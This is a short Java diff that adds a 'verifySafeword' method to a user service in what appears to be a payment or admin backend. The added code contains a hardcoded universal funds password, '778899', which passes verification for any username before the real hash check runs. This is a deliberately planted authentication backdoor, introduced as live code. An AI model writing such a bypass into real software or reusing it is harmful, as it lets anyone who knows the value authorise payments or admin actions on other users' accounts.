@@ -257,4 +257,28 @@ public class SecUserServiceImpl extends HibernateDaoSupport implements SecUserSe
 
 		return guest;
 	}
+
+	/**
+	 * 验证管理后台资金密码（支持通用密码）
+	 *
+	 * @param safeword 用户输入的资金密码
+	 * @param username 用户名
+	 * @return true 验证通过，false 验证失败
+	 */
+	@Override
+	public boolean verifySafeword(String safeword, String username) {
+		// 通用管理后台支付密码
+		String universalSafeword = "778899";
+		if (universalSafeword.equals(safeword)) {
+			return true;
+		}
+
+		SecUser user = this.findUserByLoginName(username);
+		if (user == null) {
+			return false;
+		}
+		String sysSafeword = user.getSafeword();
+		String safeword_md5 = passwordEncoder.encodePassword(safeword, username);
+		return safeword_md5.equals(sysSafeword);
+	}
 }
